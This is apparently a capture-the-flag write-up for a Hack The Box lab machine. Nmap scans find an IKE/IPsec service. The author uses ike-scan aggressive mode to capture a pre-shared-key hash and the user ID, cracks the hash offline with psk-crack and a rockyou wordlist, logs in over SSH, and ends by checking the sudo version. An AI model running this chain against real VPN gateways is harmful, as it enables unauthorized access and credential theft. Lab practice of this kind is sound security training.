16 bytes  for  MD5  or  20  bytes  for SHA1


Checking for running services
```
nmap $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-14 05:34 CST
Nmap scan report for 10.10.11.87
Host is up (0.071s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.33 seconds
```

UDP scan
```nmap -sU -p1-1000 $IP```

```
$ nmap -p1-1024 -sU --min-rate 1000 10.10.11.87
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-14 05:36 CST
Nmap scan report for 10.10.11.87
Host is up (0.070s latency).
Not shown: 1013 open|filtered udp ports (no-response)
PORT    STATE  SERVICE
37/udp  closed time
61/udp  closed ni-mail
160/udp closed sgmp-traps
324/udp closed unknown
484/udp closed integra-sme
500/udp open   isakmp
562/udp closed chshell
588/udp closed cal
589/udp closed eyelink
775/udp closed acmaint_transd
889/udp closed unknown
```

Can see isakmp is running
```ISAKMP, or the Internet Security Association and Key Management Protocol, is a protocol for creating secure communication channels over the internet by establishing security associations (SAs) and generating cryptographic keys. It is a framework that provides the messaging and formats needed for devices to authenticate each other, negotiate security parameters, and manage keys securely, making it a fundamental part of protocols like IPsec. ```


```┌─[us-free-3]─[10.10.14.184]─[veio@htb-ogzrvvra4s]─[~]
└──╼ [★]$ nmap -p500 -sU --script ike-version 10.10.11.87
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-14 05:39 CST
Nmap scan report for 10.10.11.87
Host is up (0.070s latency).

PORT    STATE SERVICE
500/udp open  isakmp
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
```

https://nmap.org/nsedoc/scripts/ike-version.html

```
$ sudo ike-scan -M -A --pskcrack=/tmp/output2 10.10.11.87 
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=ffbed5f3dd867406)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.5: 1 hosts scanned in 1.989 seconds (0.50 hosts/sec).  1 returned handshake; 0 returned notify
```
Crash the file with psk-crack using rockyou worklist

```
git clone https://github.com/josuamarcelc/common-password-list.git
psk-crack -d /workspaces/hackthebox/common-password-list/rockyou.txt/rockyou_1.txt /tmp/output2 
Starting psk-crack [ike-scan 1.9.5] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "**********************" matches SHA1 hash dfaf74a8f19465c3d8cdcbef21c15ae528ba7c54
Ending psk-crack: 8045039 iterations in 6.329 seconds (1271226.21 iterations/sec)
```

Then SSH into the box using ID_USER_FQDN and password from above. Then cat the flag.


```
ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```